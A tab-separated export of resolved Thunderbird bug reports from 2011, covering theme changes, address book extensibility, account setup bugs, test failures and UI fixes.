667241%TAB%1309009422%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%huge aero glass area at top of tbird main window needs to go away%TAB%huge aero glass area at top of tbird main window needs to go awayThe large aero-glass area at the top of the thunderbird window is pretty ugly if you have anything on your desktop underneath it and it does not make sense to have all that empty space to the right of the title in the titlebar, the right of the 4 default buttons and the right of the tab if only one tab is being used.
667133%TAB%1308936739%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Allow mail.SpellCheckBeforeSend to be tweaked by add-ons by converting it to an overridable function%TAB%Allow mail.SpellCheckBeforeSend to be tweaked by add-ons by converting it to an overridable functionUser-Agent:       Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.17) Gecko/20110428 Fedora/3.6.17-1.fc14 Firefox/3.6.17 GTB7.1 Build Identifier: Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110624 Thunderbird/7.0a1  In thread http://groups.google.com/group/mozilla.dev.apps.thunderbird/browse_thread/thread/83f98c2cab8bd58f/f104ea557a48d086 , I asked how I might be able to override mail.SpellCheckBeforeSend in my add-on without changing the preference temporarily, which is a no-no. David Bienvenu suggested perhaps adding a new function that checks the preference so that add-ons can override the function as needed. I ran that idea by Andrew Sutherland, and he liked it.  Attached, therefore, please find a patch which implements this proposed change.   Reproducible: Always
666994%TAB%1308908163%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%Update blocklist for latest updates%TAB%Update blocklist for latest updatesIf you've had Thunderbird for more than a day, you'll have got this anyway. However for those users first-starting they may need this, especially because of the graphics drivers blocklist items.  Our beta testers would already have the blocklist update (via the automated download) so this should be safe to take and we need it on all our current channels.  If bug 635662 was set up, then this would have been automated for us, but we'll get that implemented soon.
666978%TAB%1308905505%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Tree twisty in folder pane doesn't update when expanding%TAB%Tree twisty in folder pane doesn't update when expandingWhen expanding a row in the folder pane, the twisty isn't updated so it still looks like the collapsed twisty, not the expanded one. Once the mouse leaves that row, everything is back to normal. I'm not really sure what's happening here; everything is fine in the thread pane.  It appears this also happens when hitting the right arrow to expand a row.
666232%TAB%1308715064%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Smaller resize grips on Linux%TAB%Smaller resize grips on LinuxSimilar to what we've done on the Windows theme recently, it would be nice to replace the big clunky grip areas with a single line (with a regular sized resize area)
666231%TAB%1308714297%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Monochrome graphics for the message list tree header%TAB%Monochrome graphics for the message list tree headerSimilar to bug 666229 and bug 665871, we could use this single colored style in the tree headers as well.
666229%TAB%1308714070%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Theme%TAB%simple, glyphs for the message header buttons%TAB%simple, glyphs for the message header buttonsSimpler icons looks really nice, similar to bug 665871 it would look nice to do this for the message header graphics as well.
666227%TAB%1308713775%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Change toolbar and tab background area pick up window control color%TAB%Change toolbar and tab background area pick up window control colorHaving the entire area behind the tabs pick up the window header background looks pretty neat on Firefox, look into if this is possible on Thunderbird too. Ideally we would end up with something looking like the attached mockup.
665624%TAB%1308559758%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Permanent or highly intermittent failure in test_blocklistchange.js | 2.0 == 1.0%TAB%Permanent or highly intermittent failure in test_blocklistchange.js | 2.0 == 1.0his test has been failing on the Windows Thunderbird tinderboxes for the past few days.
665303%TAB%1308382621%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Pimp the message header appearence%TAB%Pimp the message header appearenceI, personally don't like this uniform grey background from the message header on OS X. So I've searched for a better color and the best choise I've found was a light bluish grey gradient, inspired from iTunes.  In my screenshot you can see two versions, the iTunes inspired version and a lighter version of that. The iTunes version is -moz-linear-gradient(top, #afbed6,#8399b6) and the light version is -moz-linear-gradient(top, #cdd9ea,#a7b7cc)  Pimped message header  So, I agree that a little gradient in that area would look nice, but I'm not a huge fan of the colour you chose [0].  I think we need something fairly light, to blend well with the message list and the content of the email, and something fairly neutral so that it works reasonably well with all the various themes.  So, uh, I guess that means feedback-, but if you want to try again, or chat with me on IRC about a different colour, I would love for a change like this to be made.  :)  Thanks, Blake. --  [0] Actually I really like the colour, just not in this context.
665142%TAB%1308313611%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%mark read by date should use a filter enumerator%TAB%mark read by date should use a filter enumeratorCurrently, the code that marks read by date iterates over all the headers in the db, from js, and checks each header to see if its date falls in the date range.   http://mxr.mozilla.org/comm-central/source/mailnews/base/content/markByDate.js#124  It should use a filter enumerator with the date check in the enumerator, e.g., http://mxr.mozilla.org/comm-central/source/mailnews/db/msgdb/test/unit/test_filter_enumerator.js#52  This could massively cut down on the crossing of the js c++ boundary
664967%TAB%1308271891%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Remove channel switching UI (Port bug 659972)%TAB%Remove channel switching UI (Port bug 659972)I think we should follow what Firefox have done in removing the channel switching UI - especially as they are going to remove backend support for it as well (bug 660038).  For aurora I suggest we follow what Firefox has done - remove the UI keeping the strings. The only thing we need to be careful about there is that we keep the "Earlybird" as the display name on the aurora channel.  For central, we can just remove everything.  Protz: could you take this on? Should be quite simple.
664794%TAB%1308218446%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Update branding for Thunderbird's aurora equivalent channel: Earlybird%TAB%Update branding for Thunderbird's aurora equivalent channel: EarlybirdAs per the discussions on tb-planning, we've chosen the name Earlybird for the aurora channel.  We'll start off with just redoing the text names etc, and we'll redo the actual images later.  Note that for the back-end, we're going to be keeping to aurora, as that's the AUS channel name, and the repo name etc.
664726%TAB%1308205162%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Add hooks to make address book more extend-able%TAB%Add hooks to make address book more extend-ableMy work with EDS contacts integration requires a few additional hooks in the TB address book. In order to get auto-complete working with my EDS contacts add-on, I needed to create a scriptable wrapper for the nsAbQueryStringToExpression::Convert method.  Blake suggested I stuff it into something like nsIAbUtilsService for now, just in case something similar comes up.  I've also added a PhotoType for contacts, "data_uri", which allows me to render contact photos dumped out via EDS.
664640%TAB%1308156760%TAB%139489%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%artificial titles of message/rfc822 attachments borrow from names of other attached files instead of own subject lines%TAB%artificial titles of message/rfc822 attachments borrow from names of other attached files instead of own subject linesUser-Agent:       Mozilla/5.0 (Windows NT 5.1; rv:7.0a1) Gecko/20110615 Firefox/7.0a1 Build Identifier: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20110614 Thunderbird/5.0b2pre  A message I composed contained the following attachments, among others: * a file, * another message  Normally Thunderbird Nightly (Miramar) shows attached email messages under horizontal lines with titles copying subject lines, with the ".eml" suffix added.  In my particular case, the title unexpectedly borrowed its text from the name of another attached file.  My complete message had a file attachment preceding the nameless message/rfc822 attachment.  I present some of the headers in my composed message for illustration.  I stubbed my company's details from some header parts.  ... Content-Type: multipart/mixed; boundary="_XXX_" MIME-Version: 1.0  --_XXX_ Content-Type: text/plain; charset="utf-8" Content-Transfer-Encoding: base64  ...  --_XXX_ Content-Type: audio/wav; name="foo.wav" Content-Description: foo.wav Content-Disposition: attachment; filename="foo.wav"; size=687148; 	creation-date="Wed, 15 Jun 2011 22:41:34 GMT"; 	modification-date="Wed, 15 Jun 2011 22:41:34 GMT" Content-Transfer-Encoding: base64  ...  --_XXX_ Content-Type: audio/wav; name="bar.wav" Content-Description: bar.wav Content-Disposition: attachment; filename="bar.wav"; size=678828; 	creation-date="Wed, 15 Jun 2011 22:41:35 GMT"; 	modification-date="Wed, 15 Jun 2011 22:41:35 GMT" Content-Transfer-Encoding: base64  ...  --_XXX_ Content-Type: message/rfc822  From: Ilguiz Latypov <ilatypov@example.com> To: x x <xxx@example.com>, y 	<y@example.com> Content-Class: urn:content-classes:message Date: Wed, 15 Jun 2011 17:50:16 -0400 Subject: Polly Wolly Doodle Thread-Topic: Polly Wolly Doodle Thread-Index: AxxxQ== Message-ID: <3yyyF@example.net> Accept-Language: en-US, en-CA Content-Language: en-US X-MS-Has-Attach: yes X-MS-Exchange-Organization-SCL: -1 X-MS-TNEF-Correlator: acceptlanguage: en-US, en-CA Content-Type: multipart/mixed; 	boundary="_YYY_" MIME-Version: 1.0  --_YYY_ Content-Type: text/plain; charset="utf-8" Content-Transfer-Encoding: base64  ...  --_YYY_ ...  --_YYY_--  --_XXX_--   Reproducible: Always  Steps to Reproduce: 1. Start a new message. 2. Attach a file. 3. Attach another message by, for example, dragging-and-dropping an element of the message list pane into the attachment pane of the composed message. 4. Save the message. 5. Close the message composition window. 6. Find the composed message in the Drafts folder and click it once. 7. Observe the titles of the attached file and the attached message in the message view pane below the message list pane.   Actual Results:   The attached message has the title copying the name of the attached file.   Expected Results:   The attached message should have the title copying the subject line, with the added ".eml" suffix.   I believe that the algorithm determining the title of nameless attachments has a defect allowing previously attached file names to spill into unnamed attachments.
663971%TAB%1307968026%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Account wizard no longer looks at MX entries%TAB%Account wizard no longer looks at MX entriesSeems like we lost the MX feature during the big rewrite in bug 549045.
663687%TAB%1307840935%TAB%393225%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Manually moving mails to a local folder - the folder becomes invisible and the mail info becomes small and blurred%TAB%Manually moving mails to a local folder - the folder becomes invisible and the mail info becomes small and blurredUser-Agent:       Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0; .NET4.0C; .NET4.0E) Build Identifier: 5.0b1  When I manually move one og more mails from the inbox to a local folder the folder becomes invisible and the mail info becmes small and blurred. See image on the URL above.  Reproducible: Always  Steps to Reproduce: 1.Drag a mail from the inbox to a local folder 2. When the mail is above (hovered) the local folder the folder becomes invisible and the mail info becomes small and blurred. 3.  Actual Results:   The mail is moved ok, but it is hard to see if you hit the right folder and if it is the right mail you are moving.  Expected Results:   The local folder should be visible all the time and the mail info sholud not become small and blurred.
663631%TAB%1307774540%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Simplify getParentIndex in folderPane.js and jsTreeView.js%TAB%Simplify getParentIndex in folderPane.js and jsTreeView.jsOver in bug 422845 Neil suggested a way of simplifying the getParentIndex in the folderPane.js code that can also be applied to jsTreeView.js code.
663608%TAB%1307751912%TAB%94421%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%add strings to  netError.xhtml for NS_ERROR_CORRUPTED_CONTENT, and update strings for offline%TAB%add strings to  netError.xhtml for NS_ERROR_CORRUPTED_CONTENT, and update strings for offlineWhen Thunderbird trunk (7.0a1) is in online mode, but can't reach the network, a yellow XML missing entity error is displayed instead of the start page, because the entity corruptedContentError.title is missing. That was introduced by bug 651486 and needs to be added to mail's netError.dtd.  Furthermore, I'm going to fix bug 435325 (Offline-mode error page should switch to online mode when clicking 'Try Again') soon, which changes an entity.  The patch addresses both issues. Tested locally. I'll check it in at the same time as bug 435325 to avoid breakage, even if it's not reviewed by then; hope that's ok.  I'm aware of bug 653386, but that is not urgent.
663193%TAB%1307616221%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%Cannot attach non-file attachments from command line%TAB%Cannot attach non-file attachments from command lineSteps to reproduce 1/ Try starting TB from commandline with following commmand: thunderbird -compose attachment=http://www.google.co.uk/  Expected result 1/ TB opens with compose window and www.google.co.uk web page attached.  Actual result 1/ TB errors with message "An error occurred while creating a message compose window. Please try again." and then exits when acknowledged.  Note There is an issue with sending non-ascii web pages but that is bug 663183
662960%TAB%1307541993%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Investigate how to provide rich error messages on waitForEval timeouts with MozMill 1.5%TAB%Investigate how to provide rich error messages on waitForEval timeouts with MozMill 1.5With our current version of MozMill (1.4.2b1), controller.waitForEval returns true on happening and false on timing out. This allows us to detect the timeout and throw a potentially richer and more detailed error with mark_failure, e.g. at <https://mxr.mozilla.org/comm-central/source/mail/test/mozmill/shared-modules/test-folder-display-helpers.js#1644>.  With MozMill 1.5, waitForEval throws a canned exception on timing out. While this is great for detecting bugs, it is somewhat less so for seeing exactly what went wrong. The alternative is to use waitFor and pass in a string, but that doesn't directly allow printing the state of something after it's timed out, just an effectively static string.  One way to fix this seems be to wrap the data in an object which when toString() is called does whatever mark_failure does, and pass this object in as the second argument to waitFor. We're essentially tricking mozmill into calling mark_failure whenever an error happens.
662792%TAB%1307510227%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Thunderbird (too) aggressively marks messages as read after display%TAB%Thunderbird (too) aggressively marks messages as read after displayThe idea is that libmime calls msgWindow.msgHeaderSink.onEndHeaders as soon as it's done displaying the message. What happens next is onEndHeaders calls msgLoaded.  msgLoaded does:  2923   if (msgHdr && !msgHdr.isRead && markReadAutoMode)  and then goes on marking the message as read. What I do with Conversations is if a conversation is currently displayed, and new messages arrive in that conversation, I append them at the bottom, expand them, but do not mark them as read, so that the user can figure out there are new messages pending in a conversation.  This breaks us because in some cases, the message is marked as read when displayed. This doesn't happen all the time, because most of the time   2908   var msgHdr = gMessageDisplay.displayedMessage; 2909   if (!folder || !msgHdr) 2910     return;  returns earlier, gMessageDisplay.displayedMessage being null.  I need to investigate this more, but I'm considering doing   2923   if (msgHdr && !msgHdr.isRead && markReadAutoMode && gMessageDisplay.singleMessageDisplay)  just to be on the safe side.
662087%TAB%1307190775%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%Adding attachments via the command-line doesn't record their size%TAB%Adding attachments via the command-line doesn't record their sizeFrom bug 661993 comment 1: > Jim, the other day I tried to start thunderbird from the terminal: >  > thunderbird -compose "attachment='/home/jonathan/whatever.txt'" >  > and then the file size for the attachment wasn't shown. You might want to > fix this case as well... :-)  Attached is a patch for this, but no tests, since I'm not sure how to test command-line arguments, or if that's even possible.
662051%TAB%1307167319%TAB%31289%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%About window needs a close button,Port |Bug 608934 - About window needs a close button| to comm-central%TAB%About window needs a close button,Port |Bug 608934 - About window needs a close button| to comm-centralFirefox about dialog has close button now by bug 608934. I think Thunderbird about dialog should have close button too.
662015%TAB%1307138126%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Dualbuttons in message header have no right margin%TAB%Dualbuttons in message header have no right marginAs seen in the attached screenshot, the dualbuttons ("reply all" and "save") have no right margin, which looks strange. The "reply all" button also has a too-large left margin. This is a minor issue, but still kinda annoying, especially for the "save" button, which defaults to being the rightmost one.
661906%TAB%1307095445%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Random Orange TEST-UNEXPECTED-FAIL | (runtestlist.py) | Exited with code 1 during test_order_of_address_books%TAB%Random Orange TEST-UNEXPECTED-FAIL | (runtestlist.py) | Exited with code 1 during test_order_of_address_booksI've been seeing this periodically on the various Tinderboxen:  mozmill.startRunner :: True mozmill.setState :: 'currentState' mozmill.setModule :: 'currentModule' mozmill.setState :: 'currentState' mozmill.setTest :: {'name': 'setupModule', 'filename': '/buildbot/comm-central-linux64-opt-unittest-mozmill/build/mozmill/addrbook/test-address-book.js'} mozmill.setState :: 'currentState' mozmill.setTest :: {'name': 'test_order_of_address_books', 'filename': '/buildbot/comm-central-linux64-opt-unittest-mozmill/build/mozmill/addrbook/test-address-book.js'} error: uncaptured python exception, closing channel <jsbridge.network.BackChannel connected 127.0.0.1:24242 at 0x20e60e0> (<type 'exceptions.KeyError'>:'message' [/tools/python/lib/python2.5/asyncore.py|readwrite|93] [/tools/python/lib/python2.5/asyncore.py|handle_read_event|390] [/tools/python/lib/python2.5/site-packages/jsbridge/network.py|handle_read|93] [/tools/python/lib/python2.5/site-packages/jsbridge/network.py|process_read|253] [/tools/python/lib/python2.5/site-packages/jsbridge/network.py|fire_callbacks|268] [/tools/python/lib/python2.5/site-packages/jsbridge/network.py|fire_event|289] [/tools/python/lib/python2.5/site-packages/mozmill/__init__.py|__call__|104] [runtest.py|logFailure|364]) endRunner was never called. There must have been a failure in the framework. ##### MOZMILL-RICH-FAILURES-BEGIN ##### ##### MOZMILL-RICH-FAILURES-END ##### TEST-UNEXPECTED-FAIL | (runtestlist.py) | Exited with code 1 during directory run INFO | (runtestlist.py) | addrbook: 0 passed, 0 failed  I have a feeling this is due to periodic cases where we attempt to test the order of address books before the address book entries have appeared in the tree view.
661795%TAB%1307069534%TAB%377950%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%POP3 Settings are used when IMAP is selected in Add new mail account dialog for yahoo.com accounts,[autoconfig] POP3 Settings are used although IMAP is selected, for ISPs where POP3 is the default and IMAP is optional%TAB%POP3 Settings are used when IMAP is selected in Add new mail account dialog for yahoo.com accounts,[autoconfig] POP3 Settings are used although IMAP is selected, for ISPs where POP3 is the default and IMAP is optionalUser-Agent:       Mozilla/5.0 (Windows NT 6.1; rv:7.0a1) Gecko/20110602 Firefox/7.0a1 Build Identifier: Thunderbird/5.0b1  Account creation wizard uses POP3 settings even when IMAP is selected for yahoo.com accounts.  Reproducible: Always  Steps to Reproduce: To reproduce this issue,  1.Install and Run thunderbird 5 beta 1 with fresh profile 2.In account creation wizard use a yahoo.com email account 3.After filling other details, click continue 4.Now Thunderbird will contact ISP Database and get the details 5.The radio box is selected (By default) as IMAP but the details are shown for POP3 If i continue to click create account, POP3 settings are used. Note: If i click on IMAP radio box again, the settings are corrected.   Expected Results:   The expected result is IMAP details should be shown and when i click create account IMAP details should be used.
661720%TAB%1307026203%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Toolbars and Tabs%TAB%Add a |tabmail| property to the tab container%TAB%Add a |tabmail| property to the tab containerThis is going to make implementing app tabs easier and life simpler in general.
661528%TAB%1306992829%TAB%282357%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%New mail popup on top left and doesn't close%TAB%New mail popup on top left and doesn't closeWith actual nightly (Mozilla/5.0 (Windows NT 6.1; rv:7.0a1) Gecko/20110602 Thunderbird/7.0a1) the new mail popup opens on top left instead of bottom right. It shows also no Subject, Sender or Preview text. It also doesn't disappear after the timeout, I have to close the popup manually.  I checked with tinderbox builds
661410%TAB%1306936898%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Implement UI for out-of-process plugins%TAB%Implement UI for out-of-process pluginsBug 617906 implemented out-of-process plugins for Thunderbird, but we haven't got around to implementing the text of the UI for it so that if plugins crash, or if there missing plugins, the user gets notified.  We should do that, we should be able to copy most of it from Firefox, probably looking into browser.js.
661363%TAB%1306929705%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installer%TAB%Port bug 562753 (On upgrade, old win7 taskbar entries should have their app modal id upgraded, based on install path) to Thunderbird,Port bug 562753 (On upgrade, old win7 taskbar entries should have their app model id upgraded, based on install path) to Thunderbird%TAB%Port bug 562753 (On upgrade, old win7 taskbar entries should have their app modal id upgraded, based on install path) to Thunderbird,Port bug 562753 (On upgrade, old win7 taskbar entries should have their app model id upgraded, based on install path) to ThunderbirdThis sounds like something we need to do for pinned shortcuts.
661319%TAB%1306922050%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%JSBool assertion failure causes crash when connecting to GMail IMAP%TAB%JSBool assertion failure causes crash when connecting to GMail IMAPI've got a GMail account that I connect to with TB for testing, and recent builds are crashing when syncing with GMail.  See attached stacktrace.
661315%TAB%1306920746%TAB%279382%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Attachment names are missing in File > Attachments%TAB%Attachment names are missing in File > AttachmentsAs observed in bug 656045 comment #15, recent trunk builds do no longer list the attachment names in File > Attachments. The icons are still present, but neither the selector shortcut [0-9] nor the name itself is visible.  This worked in the May 27 trunk nightlies, broken in the June 1 Shredder 7.0a1 nightly builds on both Linux and Windows 7.  Miramar 5.0b1 builds are not affected, this is trunk only.
661267%TAB%1306913569%TAB%305876%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%teach comm-central client.py to TinderboxPrint revisions%TAB%teach comm-central client.py to TinderboxPrint revisionsTrying to get rid of another buildbot difference between mozilla-central and comm-central builds. Printing TinderboxPrint: lines so tinderbox can have links to the various revisions we built from.  Right now, this patch adds a new --tinderbox-print option to client.py (defaults to false) that results in client.py itself printing the correct TinderboxPrint: lines for the revisions of each included repo in the checkout.
661263%TAB%1306912636%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Attachment bar looses attachment number and name when action button is removed by toolbar customization,Attachment bar loses attachment number and name when action button is removed by toolbar customization%TAB%Attachment bar looses attachment number and name when action button is removed by toolbar customization,Attachment bar loses attachment number and name when action button is removed by toolbar customizationObserved in both TB 5.0b1 candidate build and in a current 7.0a1 try-server build (thus after bug 656045 patch applied) for Windows 7 and Linux.  Steps to reproduce: 1) Load a message with an attachment 2 [review]) right-click on the attachment bar and select "Customize" 3) remove the "Save" button by putting it into the palette, button disappears 4) restart Miramar/Shredder (this step is needed to see the effect) 5) select the same message or another one with one or more attachments 6) only the "twisty" and the attachment icon show up, no attachment number/size    nor the clickable name of a single attachment 7) open customization palette, the button is gone - click "Restore Default" 8) restart Miramar/Shredder, normal behavior is restored.  Error console shows at step #5 for a message with a single attachment: > Error: saveAllSingle is null > Source File: chrome://messenger/content/msgHdrViewOverlay.js > Line: 2018  For a message with multiple attachment the error reads almost the same: > Error: saveAllSingle is null > Source File: chrome://messenger/content/msgHdrViewOverlay.js > Line: 2030  The general question may be if the customization option was intentional to start with, but it would be an intuitive way to remove the button if a user doesn't want it, thus saving a few pixels of vertical space.
661239%TAB%1306908141%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%New mail notification shown for autosaved drafts%TAB%New mail notification shown for autosaved draftsSometimes I receive the new mail notification for mails that have been autosaved in my Drafts folder (IMAP) because I have a compose window open and it auto-saves the draft. I don't think these should be shown.  Possible fix, but I don't know if we want to do that: don't show the new mail alert if the folder that contains the message has nsMsgFolderFlags::Drafts (or nsMsgFolderFlags::Junk as well).
661142%TAB%1306904012%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%nsIAbCard.idl needs noscripts stripped so that nsIAbCard can be implemented in JS.%TAB%nsIAbCard.idl needs noscripts stripped so that nsIAbCard can be implemented in JS.nsIAbCard.idl currently has 8 members marked [noscript], which means that nsIAbCard cannot be fully implemented in Javascript.  These should be removed.
660809%TAB%1306815669%TAB%57981%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%about:license on Thunderbird%TAB%about:license on ThunderbirdSteps to Reproduce: 1. Start Thunderbird 2. Help -> About Shredder 3. apear about dialog 4. click "Licensing Information" 5. Opan about:license on new tab 6. Click "Mozilla Public License" link on about:license  Actual Results: Apear "Lanch Application"  Expected Results: Jamp to Mozilla Public License(#mpl)
660672%TAB%1306745459%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Toolbar dropdowns looks different than the other buttons in Aero glass%TAB%Toolbar dropdowns looks different than the other buttons in Aero glassThe dropdowns looks different from the other buttons under Aero glass.
660508%TAB%1306604428%TAB%240134%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installer%TAB%x86_64 Thunderbird 5.0 Beta 1 installs into 32-bit Windows directory,x86_64 Thunderbird 5.0 Beta 1 installs into 32-bit Windows directory (port bug 568949 to comm-central)%TAB%x86_64 Thunderbird 5.0 Beta 1 installs into 32-bit Windows directory,x86_64 Thunderbird 5.0 Beta 1 installs into 32-bit Windows directory (port bug 568949 to comm-central)Thunderbird 5.0 Beta 1 builds, installs and runs correctly when built as a 64-bit Windows application.  The installer, though, wants to install to subdirectory "C:\Program Files (x86)\Mozilla Thunderbird 5.0 Beta 1\" by default.  The correct program directory for a 64-bit Windows application on a 64-bit version of Windows is "C:\Program Files\", not directory "C:\Program Files (x86)\".  Opting for a Custom install allows for selcting the correct program directory for installation.  The same code built as a 32-bit application also installs below "C:\Program Files (x86)\" on x64 Windows.
660165%TAB%1306449873%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Keyboard shortcuts for tags are always effective%TAB%Keyboard shortcuts for tags are always effectiveSTR: - select a thread in the thread pane, - open a chrome tab (say, a conversation tab with Thunderbird Conversations©), - hit 1, - close the chrome tab.  Results: - the thread has been tagged through the keyboard shortcut  Expected results: - the thread has not been tagged  This is very confusing, and other keyboard shortcuts are not effective unless there's a currently focused message. If you hit the M key, for instance, it doesn't mark the thread as read/unread.  ToggleMessageTagKey and RemoveAllMessageTags from mailWindowOverlay.js should both check that the current tab is a mail:3pane one (glodaSearch, message, or folder tab types), and that it makes sense to change the selected message's tags.  As to why this command is not disabled, I think it doesn't go through the command mechanism that tells whether a given command is enabled in the current context, unlike cmd_markAsRead for instance.  Question: - does anyone have an easy, simple way to check for "this is a mail:3pane default tab disguised as either a message tab, or a glodaSearch tab"?
660019%TAB%1306399996%TAB%336257%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Special characters (UTF-8) are displayed incorrect%TAB%Special characters (UTF-8) are displayed incorrectUser-Agent:       Mozilla/5.0 (Windows NT 6.1; rv:7.0a1) Gecko/20110526 Firefox/7.0a1 Build Identifier: Mozilla/5.0 (Windows NT 6.1; rv:7.0a1) Gecko/20110526 Thunderbird/3.4a1pre ID:20110526030123  If you read a message containing special / foreign characters, encoded as UTF-8, they're displayed fine. If you change the newsgroup, reading other messages in UTF-8, suddenly special characters (every encoding, not only UTF-8 but also e.g. iso-8859-1/-15) are displayed incorrect.  Reproducible: Always  Steps to Reproduce: 1. Have message in UTF-8, containing special characters (e.g.  <4DDD3D2B.2090104@news.toscha.de>, characters are displayed fine 2. Change Group, switch among messages 3. Suddenly special characters are displayed incorrect  Actual Results:   Incorrect display of foreign / special characters, although correct declared.  Expected Results:   Correct display of foreign / special characters
659925%TAB%1306387175%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%msgHeaderSink properties are never reset after streaming%TAB%msgHeaderSink properties are never reset after streamingSo this bug originally surfaced from https://github.com/protz/GMail-Conversation-View/issues/255 ; long story short, the lightning plugin from Thunderbird Conversations uses msgWindow.msgHeaderSink.properties.getPropertyAsInterface("itipItem") to determine whether the message that was just streamed has an imip invitation in it.  The problem is, the properties of a msgHeaderSink are never reset, so the imip bar keeps showing.  Possible solutions (IIRC from the discussion on IRC with standard8): - not fix this, and assume it is up to lightning to reset the property if the message has no imip bar, - not fix this, and assume it is up to the thunderbird conversations plugin to reset the property after it's used it (assuming no one else on earth needs reading that property), - have someone set msgWindow.msgHeaderSink.properties to null.  The latter implies that we determine who should reset that property, and when. Standard8, thoughts
659788%TAB%1306330700%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%OS Integration%TAB%Add icons to Windows jumplist items%TAB%Add icons to Windows jumplist itemsCurrently our Windows jumplist items use the default Thunderbird icon. We can do better. My proposal is to extract the icon from the toolbar sprite sheet and embed it into the EXE at build time.  The attached patch does precisely that. It does depend on pypng [1] though, and we're going to need to get it on at least the Windows builders to get the patch to work. We seem to have at least three options to do so: 1. Get Mozilla-Build to include it. It's pure python, so not a hassle at all to include. 2. Add it to the comm-central repo. It's MIT-licensed and build-only, so I don't really see an issue there. 3. Get people on Windows to easy_install it. easy_install pypng.  Mark, Gozer, opinions?  We could also use a more heavyweight library like the Python Imaging Library [2], but I don't really see the point in doing so.
659746%TAB%1306323561%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists%TAB%Have the space key scroll the thread summary as well%TAB%Have the space key scroll the thread summary as wellFull disclosure: I'm actually doing this to have Thunderbird Conversations not break the space key <https://github.com/protz/GMail-Conversation-View/issues/146>. What the patch does is make the space key scroll down the multimessage (if activated) before moving on to the next unread message.  This is (imho) a minor improvement for Thunderbird, but when thunderbird conversations is installed, it makes the space key scroll down the conversation as well, before jumping to the next unread message.  The bad thing is that when jumping to the next unread message, Thunderbird expands the thread the message belongs to, and just selects that message, instead of just selecting a collapsed thread. But that's another issue.  Blake, I'm requesting review from you because I've been bothering Standard8 a lot lately. It's a very short patch, and it does the readability tweaks I mentioned over IRC earlier today.
